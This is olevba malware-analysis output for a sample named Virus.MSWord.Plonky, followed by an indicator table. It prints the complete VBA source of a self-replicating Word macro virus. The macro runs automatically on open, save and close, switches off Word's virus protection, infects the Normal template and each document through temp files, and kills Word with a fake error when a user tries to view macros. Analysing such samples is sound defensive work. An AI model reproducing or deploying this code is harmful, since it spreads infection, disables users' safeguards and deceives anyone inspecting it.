olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plonky
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plonky - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Plonky - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const sn = 0
Const sv = 1
Dim i As Integer
Dim q As Integer
Dim windir As String
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Sub AutoOpen()
On Error Resume Next
Call vvv
End Sub

Sub AutoExec()
If Dir("c:\wordkaput") = "" Then
Else
FatalAppExit 0, "Ìîäóëü WinWord âûçâàë ôàòàëüíóþ îøèáêó âðè âûçîâå VBA!"
End If

On Error Resume Next
Call vvv
End Sub
Sub FileSave()
On Error Resume Next
Call vvv
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call vvv
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub vvv()
' FA, FM <<Hello everybody>> v11
On Error Resume Next
windir = Environ("windir")
If Dir(windir & "\temped.dll") <> "" Then Kill (windir & "\temped.dll")
If Dir(windir & "\tempet.dll") <> "" Then Kill (windir & "\tempet.dll")

Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
CommandBars("Control Toolbox").Enabled = False
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("module")
ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents("module")
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("worddigger")
ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents("worddigger")

If NormalTemplate.VBProject.VBComponents.Item("Module1").codemodule.lines(32, 1) <> "Sub vvv()" Then
ActiveDocument.VBProject.VBComponents("Module1").Export (windir & "\temped.dll")
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("MODULE1")
NormalTemplate.VBProject.VBComponents.Import (windir & "\temped.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module1").codemodule.lines(32, 1) <> "Sub vvv()" Then
NormalTemplate.VBProject.VBComponents("Module1").Export (windir & "\tempet.dll")
ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents("mODULE1")
ActiveDocument.VBProject.VBComponents.Import (windir & "\tempet.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

q = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
If q > 0 Then
For i = 1 To q
ActiveDocument.VBProject.VBComponents.Item(1).codemodule.deletelines (1)
Next i
End If

q = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
If q > 0 Then
For i = 1 To q
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.deletelines (1)
Next i
End If


End Sub
Sub ViewVBCode()
If Dir("c:\kaput") = "" Then
FatalAppExit 0, "Ìîäóëü WinWord âûçâàë ôàòàëüíóþ îøèáêó âðè âûçîâå VBA!"
Else
Application.VBE.MainWindow.Visible = True
End If
End Sub
Sub ToolsMacro()
If Dir("c:\kaput") = "" Then
FatalAppExit 0, "Ìîäóëü WinWord âûçâàë ôàòàëüíóþ îøèáêó âðè âûçîâå VBA!"
Else
Dialogs(wdDialogToolsMacro).Show
End If
End Sub


Sub fileClose()
On Error Resume Next
Call vvv
ActiveDocument.Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |temped.dll          |Executable file name                         |
|IOC       |tempet.dll          |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

